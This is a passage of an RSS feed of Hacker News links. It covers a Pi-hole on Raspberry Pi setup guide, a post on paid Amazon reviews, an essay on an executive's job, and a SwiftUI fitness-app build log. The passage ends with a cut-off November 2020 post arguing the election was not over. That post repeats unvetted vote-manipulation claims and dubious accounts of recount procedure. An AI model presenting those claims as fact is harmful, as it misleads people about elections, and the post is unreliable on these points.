<li>I don’t love networking much, simply because I suck at it. I have a basic understanding of high-level concepts about many parts of it, but they don’t always translate to how things work in real life. I roughly know how computers communicate over a network, but I quickly get lost when I need to debug a bad connection for example. The good thing is that it means I’ll aim to keep this guide as simple as possible so that I can understand it as well.</li>
</ul>
<p>So, since we are done with the disclaimers, let’s touch on the basics a bit before we get on with the guide. If you know all the tools and technologies mentioned above, feel free to skip that part.</p>

<p>Since we’ll need to get a bit technical in the article, there are a couple of things we need to clarify so that there will be less confusion moving forward. I’ll try to be brief here, and add some reading material in case you’d like to learn more.</p>
<h2 id="what-is-raspberry-pi">What is Raspberry Pi?</h2>
<p>Raspberry Pi is a simple, single-board computer that is originally developed for educational purposes; however, the board has become widely popular among makers and has been very popular for many use-cases including robotics, home automation, and IoT. The first one being launched in February 2012, the Raspberry Pi has 4 generations as of today, the latest one being the most advanced one including a Quad-core ARM processor and up to 8GB RAM. The latest version of it starts from $35 and goes up to $75; not super cheap, but a good price for a general-purpose computer.</p>
<p>Think of Raspberry Pi as a simple desktop computer without any screens or peripherals attached. You can connect screens to it, you can connect your keyboard, mouse, ethernet, and use it as a regular computer. There are tons of use-cases that don’t need these peripheral devices, therefore it is common to see Raspberry Pi devices being used inside handheld devices, or hidden in an office space as a network device, or whatever. It is a general-purpose computer, and your imagination is the limit here.</p>
<p>The device looks like this:</p>
<p><img src="https://burakkarakan.com/blog/assets/images/pihole-docker/raspberry-pi.png" alt="Raspberry Pi 4, [from the official Raspberry Pi website](https://www.raspberrypi.org/products/raspberry-pi-4-model-b/)"></p>

<p>They also have an even-cheaper and smaller version of the same family, Raspberry Pi Zero W, which has fewer resources than the regular Pi, but it is even smaller than the regular ones, making it suitable for IoT applications and mobile use-cases. The current selling price for the Zero W is <a href="https://www.raspberrypi.org/products/raspberry-pi-zero-w/">$10</a>.</p>
<p><img src="https://burakkarakan.com/blog/assets/images/pihole-docker/raspberry-pi-zero.jpg" alt="Raspberry Pi Zero, [from raspberrypi-spy.co.uk](https://www.raspberrypi-spy.co.uk/2015/11/introducing-the-raspberry-pi-zero/)"></p>

<p>All the Raspberry Pi devices are capable of running various operating systems (OS) depending on the specific model you have; however, the most common operating system for Raspberry Pi is <a href="https://www.raspberrypi.org/downloads/raspberry-pi-os/">Raspberry Pi OS</a>, Raspbian with its old name. It is based on Debian, has a bunch of simple installers, and it is a good starting point for tinkering with the Pi. I strongly recommend going with the Pi OS if you are just getting started with the ecosystem, it’ll definitely simplify your journey in the beginning in terms of finding documentation and help online.</p>
<p>For learning more about the Raspberry Pi, head over to the official <a href="https://www.raspberrypi.org/">Raspberry Pi website</a>.</p>
<h2 id="what-is-pi-hole">What is Pi-hole?</h2>
<p><a href="https://pi-hole.net/">Pi-hole</a> is a plug-and-play software that offers network-wide <a href="https://en.wikipedia.org/wiki/DNS_sinkhole">DNS sinkhole</a> for filtering out content for all the devices connected to the same network. In simple terms: when your browser tries to connect a server to show you some content on a website, Pi-hole will resolve the IP address for that host into a blackhole IP address if it is on a blocklist, meaning that your computer will not reach the ad server, and as a result, you won’t see ads. This has a bunch of benefits for the end-user:</p>
<ul>
<li>There is no need to install specific software to any of the devices connected to the network, and all of your devices can benefit from this, including your smart TV and mobile devices.</li>
<li>This allows blocking not only the traditional ads on websites but also the in-app ads that are embedded in other places, such as the operating system of your smart TV.</li>
<li>Since the request for the ad content will never leave your network, nothing will be downloaded, and your network performance will improve.</li>
<li>It also blocks some trackers, which means it automatically provides better privacy while you are surfing.</li>
</ul>
<p>All in all, Pi-hole is a neat piece of open-source software that gives you better visibility and control into the ad traffic that is happening in your network. For more details, go ahead and visit their <a href="https://pi-hole.net/">website</a>, as well as their <a href="https://github.com/pi-hole">GitHub organization</a> for checking the source code and learning more about the project.</p>
<h2 id="what-is-docker">What is Docker?</h2>
<p>The poster-child for the cloud-native era, Docker has been a very popular software in the last couple of years. It is essentially a nicely packaged system that simplifies managing containers on many different operating systems, and it is the de-facto standard engine for running containers. It allows you to package your application and its dependencies in a simple format and share them. You can head over to the following link to learn more about Docker (spoiler alert: I wrote the article):
<a href="https://medium.com/swlh/what-exactly-is-docker-1dd62e1fde38"><strong>What Exactly is Docker?</strong></a></p>

<p>So, I wanted to set up Pi-hole on my home network, and I had a <a href="https://www.raspberrypi.org/products/raspberry-pi-3-model-b-plus/?resellerType=home">Raspberry Pi 3 Model B+</a> lying around. I had a couple of goals before I started the setup:</p>
<ul>
<li>I wanted to be able to manage the device remotely; meaning that all I need to change things there should be a working network connection to the device, and since I’ll start with my home network, that’ll be a given anyway. I don’t want to depend on keyboards, screens, or other peripherals to be able to play with it.</li>
<li>I wanted to utilize the same Pi for my other use-cases such as home automation; therefore, I wanted to keep the Pi installation as clean as possible, in case I’d need to rebuild the same setup using a different device, or if I need to do a clean install on another storage device.</li>
<li>I wanted to be able to keep my setup in a Git repo in order to be able to keep track of my changes and have a backup, because, why not?</li>
<li>I wanted the setup to be easy to reproduce in other devices and networks so that I can set it up for my family and friends as well.</li>
<li>I wanted to be able to extend my setup with other use-cases, hopefully with some sort of automation to deploy my changes to the Pi. I can always connect to the Pi and install whatever I need manually, but this would contradict my previous goal to make the setup easy to reproduce.</li>
</ul>
<p>For some of you, these goals might be irrelevant, and that’s totally fine. I just wanted to aim for these and learn to try to achieve them.</p>
<p>In the end, I decided to go for a simple Pi OS Lite setup with Docker &amp; Docker Compose to manage Pi. The reason I picked the Lite OS is that I didn’t need a desktop environment and the other software that comes with the default Raspberry Pi OS, such as games or office software. The reason I decided on Docker is that I wanted to be able to run everything as containers on the device to not to depend on manual installation and the dependency hell, and Docker Compose is to be able to define all the things I’ll run in a simple YAML format that I can keep in the version control. In addition, relying on Docker from the beginning enables me for future adventures in case I want to go there, such as <a href="https://magpi.raspberrypi.org/articles/build-a-raspberry-pi-cluster-computer">building clusters</a> or <a href="https://ubuntu.com/tutorials/how-to-kubernetes-cluster-on-raspberry-pi#1-overview">running Kubernetes on Raspberry Pis.</a> Of course, these are not requirements, just potential ideas for my amusement.</p>
<p>As I have mentioned before, this doesn’t mean that you have to run this very same setup for your installation; it just happened to be the one I chose. The rest of the article will be about getting this configuration up and running, so, follow along if you are still interested.</p>

<p>Our requirements for the project is relatively simple:</p>
<ul>
<li>A primary computer to manage the whole installation in your network.</li>
<li>A working internet connection.</li>
<li>A router with ethernet ports. You can also use the built-in Wi-Fi some models have, although it will perform better if you use a cable connection.</li>
<li>A Raspberry Pi, I’d imagine any model would do the job here.</li>
<li>A MicroSD card for installing the operating system. If you already have an installed one, that’s also fine, it shouldn’t matter much which OS you have.</li>
</ul>
<p>The rest of the article will assume that you meet these requirements on your part.</p>
<p>The steps we’ll take are:</p>
<ul>
<li>Setup the SD-card for booting the device</li>
<li>Connect the Pi to your router, and access the internet</li>
<li>Install Docker</li>
<li>Run Pi-hole using Docker &amp; Docker Compose</li>
<li>Replace your router’s DHCP server with the Pi-hole DHCP server</li>
<li>That’s it!</li>
</ul>
<p>Let’s get started.</p>
<h2 id="before-you-go-on">Before you go on</h2>
<p>One thing to keep in mind is: Pi-hole cannot remove all the ads from all the websites. Blocking ads is simply a cat-mouse game, and Pi-hole is trying to disable them on the DNS level, meaning that you should still keep your blocker extensions on your browser for a good experience. Pi-hole will definitely contribute to your overall experience but do not get pissed off if it doesn’t remove all the ads, some ads are practically impossible to get rid of without significant effort.</p>
<p>If you are looking for a blocker extension, I recommend the open-source <a href="https://github.com/gorhill/uBlock">uBlock Origin</a>: here’s for <a href="https://chrome.google.com/webstore/detail/ublock-origin/cjpalhdlnbpafiamejdnhcphjbkeiagm?hl=en">Google Chrome</a> and here’s for <a href="https://addons.mozilla.org/en-US/firefox/addon/ublock-origin/">Mozilla Firefox</a>.</p>

<p>You can skip this section if you already have a …</p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://burakkarakan.com/blog/pihole-on-raspberry-using-pi-docker-and-docker-compose/">https://burakkarakan.com/blog/pihole-on-raspberry-using-pi-docker-and-docker-compose/</a></em></p>]]>
            </description>
            <link>https://burakkarakan.com/blog/pihole-on-raspberry-using-pi-docker-and-docker-compose/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25069717</guid>
            <pubDate>Thu, 12 Nov 2020 13:41:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Can You Trust Amazon Reviews?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25069477">thread link</a>) | @TimLeland
<br/>
November 12, 2020 | https://timleland.com/can-you-trust-amazon-reviews/ | <a href="https://web.archive.org/web/*/https://timleland.com/can-you-trust-amazon-reviews/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-11141">
<img width="750" height="410" src="https://i0.wp.com/timleland.com/wp-content/uploads/2020/11/Can-You-Trust-Amazon-Reviews.png?resize=750%2C410&amp;ssl=1" alt="" loading="lazy"> <div>

<div>
<p>When you are considering buying a product on Amazon, how much do the reviews matter to you? Most people see lots of 5 stars and assume that the product must be great! Unfortunately, this may not be the best solution for validating Amazon reviews. Often people are sent free products for positive reviews or they are given refunds if they leave 5-star reviews. If I am ever suspicious of a product, I will use <a href="https://reviewmeta.com/" target="_blank" rel="noopener noreferrer">ReviewMeta</a> to check how valid the reviews are.</p>
<p>Review Meta allows you to paste in a link from Amazon to verify if the reviews are valid. I recently purchased a <a href="https://amzn.to/3la6xqn">headlamp</a> from Amazon that had almost 3,000 5 star reviews. I received the <a href="https://amzn.to/3la6xqn">headlamp</a> and it came with a card that if I left a 5-star review, I would receive a $15 Amazon gift card. To see if this was legit, I left a 5-star review and followed the instructions to email proof of the review. To my surprise, I received a $15 Amazon gift card for an $18 <a href="https://amzn.to/3la6xqn">flashlight</a>. When checking the flashlight on Review Meta the adjusted rating was 214 Reviews with 69% potentially unnatural reviews.<span id="more-11141"></span></p>
<p>Review Meta also offers <a href="https://reviewmeta.com/blog/extensions/" target="_blank" rel="noopener noreferrer">browser extensions</a> for those who want to quickly check reviews. Next time you plan to purchase something on Amazon, make sure you check if the reviews are valid.</p>
<p><span><iframe width="648" height="365" src="https://www.youtube.com/embed/ypZAsUh2M8M?version=3&amp;rel=1&amp;fs=1&amp;autohide=2&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;wmode=transparent" allowfullscreen="true"></iframe></span></p>


 </div>

</div>
</article></div>]]>
            </description>
            <link>https://timleland.com/can-you-trust-amazon-reviews/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25069477</guid>
            <pubDate>Thu, 12 Nov 2020 13:16:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What Executives Do]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25069263">thread link</a>) | @swyx
<br/>
November 12, 2020 | https://boz.com/articles/executive | <a href="https://web.archive.org/web/*/https://boz.com/articles/executive">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><p>I recently held a question and answer session with a particularly talented
group of my colleagues who are taking on a challenging task. At the end they
thanked me for making the time to speak with them, as is often done. It always
strikes me as bizarre when people thank me for taking an hour of my time when
they are doing the real work.</p>
<p>I have come to realize that very few people have any idea what I do all day,
though most generously assume I must be very busy with big important things.
I often joke that I don’t do any real work, but that isn’t entirely fair.
What I mean is that the work I do is entirely indirect. I write neither code
nor copy, design neither atoms nor bits, sell neither hardware nor software.
None of my actions directly creates value or prevents harm. I thought it might
be interesting to walk through what I think my job is as “an executive.”</p>
<p>Job #1: <strong>Convince smart people to work with me</strong>. As I do very little direct
work it is important I hire people who are more able than I to direct said
work. It is only a slight exaggeration to say that nearly everything I do
affects my ability to hire the best people. Every private conversation accrues
in some part to my public reputation which reaches would be colleagues long
before I do. The more I am able to adapt to a wide range of working styles the
more people I become compatible with. Every public success or failure makes
people more or less open to the idea of collaborating. Even aspects of my
personal life play a role in whether people see me as a viable person to
entrust with their career. Did you ever wonder why I started writing so many
mildly self-important notes on the internet?</p>
<p>Job #2: <strong>Allocate scarce resources</strong>. Whether it is a question of money,
people, visibility, or just attention it is up to me to keep our portfolio in
balance.  The expression people see of this most often is decisions to fund or
not fund specific work but that’s only the manifestation of this work.  The
underlying work is deciding how much risk to indulge, how to allocate across
different timelines, and how to balance across the urgent and the important.</p>
<p>Job #3: <strong>Craft vision</strong>. Creating cohesion at any meaningful scale requires a
narrative in which each person can see how their work fits in and why the work
of their peers is important. My role affords me a unique point of view across
the breadth of the work and the ability to command enough attention to create
a <a href="https://boz.com/articles/mutual-knowledge">shared understanding</a> of how it
fits together.</p>
<p>Job #4: <strong>Break ties</strong>. I make far fewer decisions than most people expect.
And I consider most of those instances a failure to provide sufficient clarity
in advance. But sometimes we run into situations that demand trade-offs
between competing priorities that we hadn’t previously imagined. In those
cases the decisions come to me and after gathering context and unblocking
teams we work to provide new standing context so future decisions can be
resolved locally much more quickly.</p>
<p>Job #5: <strong>Curate Culture</strong>. My friend and former colleague Jocelyn Goldfein
wrote “<a href="https://jocelyngoldfein.com/culture-is-the-behavior-you-reward-and-punish-7e8e75c6543e">culture is the behavior you reward and
punish</a>.”
As the person in the organization with the broadest visibility and the biggest
platform that makes me uniquely suited to shape culture by choosing what to
bring positive and negative attention to.</p>
<p>Job #6: <strong>Advocate, explain, and be held accountable</strong>. This is the smallest
part of my job but by virtue of being more visible is often what people think
is the most important. Our products must speak for themselves and our
consumers will always be the loudest voice controlling their adoption. But we
do our best around the edges to communicate both externally and internally to
help people understand our work. And at the end of the day our own leadership
and the public will rightly lay responsibility for any failures at my feet.</p>
<p>Of this list only #2 and #4 are really exclusively my domain, the rest are
responsibilities I carry jointly with the team itself. The reason I keep
putting “executive” in quotes is that it isn’t a real job. In fact I don’t
think I’ve seen the title used outside of the media; and then it is usually to
build someone up to make a story more impressive. In reality I am just a
people manager. And of course like any great manager when I’m doing my job
well, I have to do very little of anything. It truly is a shame, then, that I
really am always so busy…</p></section></div></div>]]>
            </description>
            <link>https://boz.com/articles/executive</link>
            <guid isPermaLink="false">hacker-news-small-sites-25069263</guid>
            <pubDate>Thu, 12 Nov 2020 12:51:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building, Releasing and Marketing an iOS Fitness App]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25069237">thread link</a>) | @marcgg
<br/>
November 12, 2020 | https://marcgg.com/blog/2020/11/12/building-boxing-mobile-app-swiftui/ | <a href="https://web.archive.org/web/*/https://marcgg.com/blog/2020/11/12/building-boxing-mobile-app-swiftui/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="container"> <div id="content"> <div id="post-"> <p>I practice boxing as a hobby, so when the first lockdown in France happened I decided to keep training at home. However I quickly found out that it was tough to stay focused on my own. I tried various solutions, like boxing along Youtube videos, but it got repetitive and a lot of videos didn’t fit the way I wanted to work out… I tried fitness apps, but they were focused on <a href="https://en.wikipedia.org/wiki/Calisthenics">calisthenics</a>, not boxing.</p> <p>It’s at that point I decided to build a small algorithm to create some kind of training plan and help me focus when training. It would be a fun side project helping me stay motivated to train alone. After some work this idea turned into a mobile app and finally into a <a href="https://shadowboxingapp.com/">product shipped to the App Store</a>!</p> <p>In this article I’ll try to talk about pretty much every aspect of the app development process, including SwiftUI, marketing, design, keyword optimizations, search ads, SEO and more. I think it can be interesting for anyone curious about building a product from nothing. I’d also say that if you are a solo developer wanting to get into the app space, this article can be a good read to help kickstart your project and gather some ideas.</p> <p>Some random stats at the time of writing this article:</p> <ul> <li>I <strong>started learning Swift 6 months ago</strong></li> <li>The app has been officially live for 3 months**, and I started actively promoting it 2 months ago</li> <li>The app was <strong>featured on the app store in 8 countries</strong></li> <li>The app has <strong>a few thousands monthly active users</strong>, of which <strong>~5% are paying customers</strong></li> <li>The algorithm features <strong>12 distinct exercises &amp; 25 workouts</strong></li> </ul> <p><img src="https://marcgg.com/assets/blog/swift/screenshot_practice_rotated.png" alt="Shadow boxing training app"></p> <h2 id="building-the-boxing-app-mvp">Building the Boxing App MVP</h2> <p>I’m a big fan of <a href="https://pragdave.me/blog/2014/03/04/time-to-kill-agile.html">working with agility</a>, so I wanted to build in increments starting with a <a href="https://en.wikipedia.org/wiki/Minimum_viable_product">minimum viable product</a> to gather feedback as soon as possible. Once this was done, the plan was to add to it depending on what I learned along the way.</p> <h3 id="initial-requirements">Initial Requirements</h3> <h4 id="the-algorithm">The Algorithm</h4> <p>In boxing a lot of people talk about punches using a numerical code. For instance 1 is a jab, 2 is a cross, 3 is a left hook and so on. This allows boxers to codify combinations of techniques. You must have heard “1-2” before for a jab-cross, but you could also do something more complex.</p> <p>To start I built a combo generation logic. Some techniques flow perfectly with each other, and some others just do not work together at all. For instance:</p> <ul> <li>1-2-3 (jab, cross, left hook) feels right, is easy to do and flows really well.</li> <li>1-1-1-1-1 (five jabs) is hard on the lead hand and shoulders and not very realistic.</li> <li>1-3 (jab, left hook) is a bit awkward but is an interesting mixup.</li> <li>5-5-5-5 (four left uppercut) makes very little sense.</li> </ul> <p>Then on top of this I can add variations, like throwing punches to the body or incorporating defensive movements. Finally I added vocal advices ranging from cheering you (“keep going!”) on to giving you generic advices (“lower your chin”).</p> <p>With this, I built different ways of giving combos to execute:</p> <ul> <li>Focus on one combo for a round, progressively adding to it. For instance start with 1-2, then after a bit build on it with a 1-2-3-2 and so on.</li> <li>Mimic <a href="https://shadowboxingapp.com/pad-work-boxing-reflexes/">pad work</a>, meaning that the app will call out a technique to execute on the spot.</li> </ul> <p>Finally I combined all of this into a coherent sequence of events, adding elements of randomness so that every single workout felt different.</p> <h4 id="mobile-app">Mobile App</h4> <p>I quickly figured that building an algorithm alone and print out exercises would not be enough, and that it needed at the very least some kind of UI. Building on mobile was what made the most sense since I would not be training in front of my computer. Here’s what I identified as must-haves at that point:</p> <ul> <li>A basic UI to set the various parameters of the algorithm</li> <li>A simple display with large fonts and clear colors to see the round timer &amp; punches to throw</li> <li>A way to give audio cues, ideally a synthesized voice so I don’t have to constantly look at my phone</li> <li>Needs to work for me, meaning running on iOS since I have an iPhone</li> </ul> <h3 id="building-with-swiftui">Building with SwiftUI</h3> <h4 id="why-pick-swiftui">Why Pick SwiftUI?</h4> <p>Since I have an iPhone, I had to build something running on it. I could have created a web version, but since the experience was going to be inherently mobile I wanted to start on the right platform and actually have he app installed on my phone.</p> <p>In the past I’ve tried many options as alternative to purely native development: <a href="https://marcgg.com/blog/2012/10/22/custom-slider-ios-rubymotion/">in 2012 I worked with RubyMotion</a>, in 2013 I’ve experimented with <a href="https://marcgg.com/blog/2013/08/29/appgyver-steroids-iphone-hybrid-javascript/">Steroids.js</a>, in 2014 <a href="https://marcgg.com/blog/2014/04/09/phonegap-steroids-hybrid-native-app-tips/">PhoneGap</a> and even <a href="https://marcgg.com/blog/2014/05/06/quantified-self-iphone-app-track-mood-day/">released an app with these alternative technologies</a>… however I always had the same issues with this approach. You end up fighting the framework, the phone and the ecosystem. Some things are missing, performances can be degraded and you have to do a lot of extra work to build what native developers get for free.</p> <p>Technologies like <a href="https://flutter.dev/">Flutter</a> have the promise of multi platform, but from my experience you still have to know the quirks of iOS and Android if you want to build an app that goes beyond a basic use case… so this means that not only you have to learn Flutter &amp; Dart, but you also have to learn some Swift, a bit of Kotlin and the iOS and Android SDKs. It might improve in the future but, in my opinion and as things are today, going native is still the better approach to get a great mobile experience.</p> <p>The annoying part was that I tried working with UIKit in the past and really didn’t enjoy it… but this is where SwiftUI comes in!</p> <p><img src="https://marcgg.com/assets/blog/swift/swift_logo.png" alt="Swift and SwiftUI logo"></p> <blockquote> <p>SwiftUI is a user interface toolkit that lets us design apps in a declarative way. That’s a fancy way of saying that we tell SwiftUI how we want our UI to look and work, and it figures out how to make that happen as the user interacts with it.</p> <p><a href="https://twitter.com/twostraws">@twostraws</a> on <a href="https://www.hackingwithswift.com/quick-start/swiftui/what-is-swiftui">Hacking with Swift</a></p> </blockquote> <p>I had my eyes on this technology ever since it came out because I always was allergic to UIKit’s way of building app and this declarative approach felt like what iOS needed. It was also an easy to grab paradigm for me thanks to my experience with ReactJS.</p> <p>Since I was lucky to work on a greenfield project, and therefore didn’t have to keep previous users in mind, I could pick this framework even if it was only compatible with iOS 13 and up.</p> <h4 id="learning-swiftui">Learning SwiftUI</h4> <p>Overall SwiftUI felt incredibly simple to understand and work with. Using <a href="https://developer.apple.com/tutorials/swiftui/">Apple’s documentation</a> and the amazing videos and articles of <a href="https://www.hackingwithswift.com/">Hacking With Swift</a>, I managed to build a very basic UI and have it on Testflight in less than 20 hours of work.</p> <p>I really can’t understate how easy it was for me to get into it. That’s really from 0 to a basic app in a couple of days.</p> <ul> <li>Swift felt very natural, and beyond a couple of quirks it was very straightforward.</li> <li>SwiftUI was also very easy to grasp, and thinking in components felt logical to me. The preview panel makes testing out things easy, and there are many very well made tutorials out there. Again, I can’t recommend <a href="https://www.hackingwithswift.com/">Hacking With Swift</a> enough.</li> </ul> <p>I was expecting to enjoy the technology, but I can honnestly say that it was a game changer to me. Even if it still has significant limitations that only appeared way later in development, I felt productive and in control.</p> <h3 id="first-version">First Version</h3> <p>After approximatively 40 hours of work, I had a workout generator, a landing screen with simple explanations and a start button leading to a form for customizing parts of the algorithm. Fun fact, all this time I was train every day using the algorithm, and sometime ending up dead tired because it wasn’t tweaked properly!</p> <p><img src="https://marcgg.com/assets/blog/swift/mvp_1.png" alt="Boxing app MVP"></p> <p>Once the training started, a timer screen would show with two different mode: fighting and active recovery. The two screens have different colors so I could be able to see from afar what is going on if I missed an audio cue. If you wonder how I built the clock section, I wrote <a href="https://marcgg.com/blog/2020/05/06/circular-progressbar-clock-swiftui/">an article on this</a>.</p> <p><img src="https://marcgg.com/assets/blog/swift/mvp_2.png" alt="Boxing app MVP"></p> <h3 id="making-the-mvp-actually-viable">Making the MVP Actually Viable</h3> <h4 id="adding-a-workout-abstraction">Adding a Workout Abstraction</h4> <p>This first version of the MVP showed me that it was indeed a useful app that I enjoyed training with. However after showing it to multiple people, it was also very clear that no one understood the customization form and what was the point of the app. To me, the cool thing with the whole thing was the algorithm, but I had to admit that it needed some kind of abstraction to present it to users.</p> <p>To do that I went ahead and built “workouts “by setting some parameters for the algorithm in advance. For instance:</p> <ul> <li>12 rounds of 3 minutes, only freestyle, 1 minute rest: this looks a lot like a normal boxing match!</li> <li>20 rounds of 1 minute, mostly intense combos with 30 seconds of active recovery: this is close to a high intensity interval workout session.</li> </ul> <p>Once this was figured out I added some text explaining what the training was and a photo to illustrate it.</p> <h4 id="discoverability-of-the-algorithm">Discoverability of the Algorithm</h4> <p>I still wanted people to build their own workouts once they used the pre-made ones for a while. So I still had a way to access the massive customization form, and I made sure that people could see the various parameters used in the workout. This would ideally get them inspired to try it themselves.</p> <h4 id="learning-design">Learning Design</h4> <p>I’ve made it very clear in the past: <a href="https://marcgg.com/blog/2014/04/28/frame-based-layout-bad-code/">I’m pretty bad at design</a>. I usually say that I’m just good enough to know that what I’m doing looks bad, which is depressing.</p> <p>For <a href="https://marcgg.com/blog/2014/05/06/quantified-self-iphone-app-track-mood-day/">my previous app</a> I had teamed up with a designer, but this time I wanted to do it on my own… but I still wanted to ship something that looked decent, and the first version with the weird orange “get started” button was everything but decent. To improve it, I decided to go through all the fitness apps I could find, watch app design videos, browse pinterest &amp; dribbble to finally be able draft something better. I also figured now would be the right time to learn how to properly use <a href="http://figma.com/">Figma</a>.</p> <p>After a few days of this and hating my life, I managed to have something that didn’t look like an abonation. What helped me getting there was:</p> <ul> <li>Leaning into Apple’s guidelines a lot with SF Icons, system fonts, padding recommendations and so on.</li> <li>Using ressources like <a href="https://coolors.co/palettes/trending">color palettes</a> and <a href="https://www.flaticon.com/">flaticon</a></li> <li>Relying on <a href="https://www.pexels.com/">stock photography</a>, as it worked well with the fitness space</li> </ul> <h4 id="improving-the-app-icon">Improving the App Icon</h4> <p>The first app icon was quickly made and didn’t feel right. After some browsing I found a stock …</p></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://marcgg.com/blog/2020/11/12/building-boxing-mobile-app-swiftui/">https://marcgg.com/blog/2020/11/12/building-boxing-mobile-app-swiftui/</a></em></p>]]>
            </description>
            <link>https://marcgg.com/blog/2020/11/12/building-boxing-mobile-app-swiftui/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25069237</guid>
            <pubDate>Thu, 12 Nov 2020 12:48:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Public Safety Announcement: The 2020 Election Is Not Over]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25069181">thread link</a>) | @lettergram
<br/>
November 12, 2020 | https://austingwalters.com/public-safety-announcement-the-2020-election-is-not-over-as-of-nov-11-2020/ | <a href="https://web.archive.org/web/*/https://austingwalters.com/public-safety-announcement-the-2020-election-is-not-over-as-of-nov-11-2020/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-3754">

<div>
<p>I have been listening to my friends and family and am concerned that many are not aware of the election process. Having the presidential election flip from Democrat to Republican at this point can cause massive rioting, violence, etc.</p>
<p>We should all be aware of the current situation and the news outlets do not appear to be informing people.</p>
<blockquote><p><strong>Disclaimer</strong>: I’m am not pro-democrat or pro-republican. Personally, I believe neither party is fit to run the country.</p></blockquote>
<p>I wanted to share what appears to be the Republican strategy and why it’s possible (though still unlikely) Trump could win.</p>
<p>At time of writing Trump the betting markets have <a href="https://electionbettingodds.com/4hr.html" target="_blank" rel="noopener noreferrer">13% odds of winning the election</a> (odds calculated average from <a href="https://www.betfair.com/exchange/plus/politics">Betfair</a> and <a href="https://www.predictit.org/promo/electionbetting">PredictIt</a>).</p>
<p><a href="https://www.predictit.org/markets/detail/3698/Who-will-win-the-2020-US-presidential-election" target="_blank" rel="noopener noreferrer">PredictIt</a> currently has 16% odds of Trump winning:</p>
<p><a href="https://austingwalters.com/wp-content/uploads/2020/11/Screenshot-from-2020-11-11-09-06-12.png"><img loading="lazy" src="https://austingwalters.com/wp-content/uploads/2020/11/Screenshot-from-2020-11-11-09-06-12.png" alt="" width="500" height="344" srcset="https://austingwalters.com/wp-content/uploads/2020/11/Screenshot-from-2020-11-11-09-06-12.png 666w, https://austingwalters.com/wp-content/uploads/2020/11/Screenshot-from-2020-11-11-09-06-12-300x206.png 300w" sizes="(max-width: 500px) 100vw, 500px" data-old-src="//austingwalters.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://austingwalters.com/wp-content/uploads/2020/11/Screenshot-from-2020-11-11-09-06-12.png" data-srcset="https://austingwalters.com/wp-content/uploads/2020/11/Screenshot-from-2020-11-11-09-06-12.png 666w, https://austingwalters.com/wp-content/uploads/2020/11/Screenshot-from-2020-11-11-09-06-12-300x206.png 300w"></a></p>
<h3>Biden is not Officially the President-Elect</h3>
<p>The president elect is determined by the electoral college or the General Services Administration (aka Trump conceding). That did not occur.</p>
<p>This is not uncommon, from <a href="https://en.wikipedia.org/wiki/President-elect_of_the_United_States" target="_blank" rel="noopener noreferrer">wikipedia</a>:</p>
<blockquote><p>The closest instance of there being no qualified person to take the presidential oath of office on Inauguration Day happened in 1877 when the disputed election between Rutherford B. Hayes and Samuel J. Tilden was decided and certified in Hayes’ favor just three days before the inauguration (then March 4).</p></blockquote>
<h3>Evidence, Pending Review</h3>
<p>It takes time to build evidence. Last night on <a href="https://www.youtube.com/watch?v=7WzYTSwt18k" target="_blank" rel="noopener noreferrer">Fox News (Hannity, 11/10/2020)</a> the Republicans discussed some of the election (video may be removed, not on Fox News website).</p>
<p>The Republicans claim 11,000+ incident reports of vote manipulation, currently being vetted by attorneys. 250+ affidavits already signed, many have corroborating physical evidence, photos or additional witnesses (unclear how much). In a section below, some specific claims are covered.</p>
<h3>The Voting Recount Process</h3>
<ol>
<li>Affidavit is necessary to challenge some ballots</li>
<li>After canvassing, Republicans can request a recount</li>
<li>A judges in each county can review evidence (aka affidavits, photos, etc)</li>
<li>The judge can remove ballots (at random) based on evidence</li>
<li>Judgements can be challenged to a higher court</li>
<li>Recount occurs after ballots removed</li>
<li>IF it’s so wide spread or there’s a major error. The house or senate decide (or special elections), it depends on the State.</li>
<li>Electors vote on to December 14 and delivered December 23rd [<a href="https://crsreports.congress.gov/product/pdf/IF/IF11641">1</a>]</li>
</ol>
<h4>State Government Affiliation(s)</h4>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Pennsylvania_General_Assembly" target="_blank" rel="noopener noreferrer">PA</a>, <a href="https://en.wikipedia.org/wiki/Michigan_Legislature" target="_blank" rel="noopener noreferrer">MI</a>, <a href="https://en.wikipedia.org/wiki/Wisconsin_Legislature" target="_blank" rel="noopener noreferrer">WI</a> and <a href="https://en.wikipedia.org/wiki/Georgia_General_Assembly" target="_blank" rel="noopener noreferrer">GA</a> have a fairly large republican majority of both houses</li>
<li><a href="https://en.wikipedia.org/wiki/Arizona_State_Legislature" target="_blank" rel="noopener noreferrer">AZ</a> has a slight republican majority of both houses</li>
<li><a href="https://en.wikipedia.org/wiki/Nevada_Legislature" target="_blank" rel="noopener noreferrer">NV</a> has a large Democrat majority in both houses</li>
</ul>
<p>It’s also still possible the United States Supreme Court could still toss hundreds of thousands of ballots out of PA (Biden’s up by 40k)[<a href="https://www.washingtonexaminer.com/news/republican-state-attorneys-general-ask-supreme-court-to-take-up-pennsylvania-late-mail-in-ballot-case" target="_blank" rel="noopener noreferrer">2</a>].</p>
<h3>Affidavit Claims</h3>
<p>Selected claims on Fox / Hannity (on 11/10/2020):</p>
